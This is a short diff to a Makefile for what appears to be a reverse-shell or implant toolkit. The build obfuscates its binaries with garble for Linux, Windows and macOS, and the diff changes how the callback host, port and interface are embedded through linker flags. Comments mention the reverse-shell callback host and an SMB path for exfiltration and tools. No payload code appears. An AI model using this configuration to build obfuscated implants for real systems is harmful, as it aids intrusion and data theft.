@@ -32,8 +32,9 @@ BUILD = $(GARBLE) -seed=random -literals -tiny build
 PLATFORMS = linux windows darwin
 
 # host the reverse shell will call back to
-LHOST ?= localhost
-LPORT ?= 8443
+INTERFACE ?= ""
+LPORT ?= ""
+LHOST ?= ""
 
 # exfil and tool path to serve over smb
 TOOLS ?= /srv
@@ -67,7 +68,7 @@ ifneq ($(UNAME), Windows)
 	DLLCC=x86_64-w64-mingw32-gcc
 endif
 # embeds paramaters
-LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
+LDFLAGS = "-s -w -X main.Iface=$(INTERFACE) -X main.Host=$(LHOST) -X main.Port=$(LPORT) -X main.fingerPrint=${FINGERPRINT}"
 # references the calling target within each block
 target = $(word 1, $@)
 
